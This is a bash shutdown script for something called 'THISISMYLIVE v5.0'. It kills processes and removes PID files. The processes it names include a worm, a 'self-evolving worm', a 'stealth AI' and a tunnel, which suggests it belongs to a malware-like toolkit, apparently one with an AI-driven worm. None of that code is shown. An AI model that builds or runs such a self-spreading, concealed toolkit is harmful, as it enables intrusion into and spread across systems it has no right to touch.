#!/bin/bash
# THISISMYLIVE v5.0 — STOP SCRIPT
# ================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

echo "[+] Stopping THISISMYLIVE v5.0..."

# Kill all related processes
pkill -9 -f "server.py" 2>/dev/null
pkill -9 -f "worm.py" 2>/dev/null
pkill -9 -f "bootstrap.py" 2>/dev/null
pkill -9 -f "kimi_self_evolving_worm.py" 2>/dev/null
pkill -9 -f "orpp_stealth_ai.py" 2>/dev/null
pkill -9 -f "ultimate_overkill_monitor.py" 2>/dev/null

# Remove PID files
rm -f server.pid worm.pid bootstrap.pid tunnel.pid

echo "✅ All THISISMYLIVE services stopped"
echo "   DNA Worm:    STOPPED"
echo "   Server:      STOPPED"
echo "   Tunnel:      STOPPED"
echo "   Watchdog:    STOPPED"
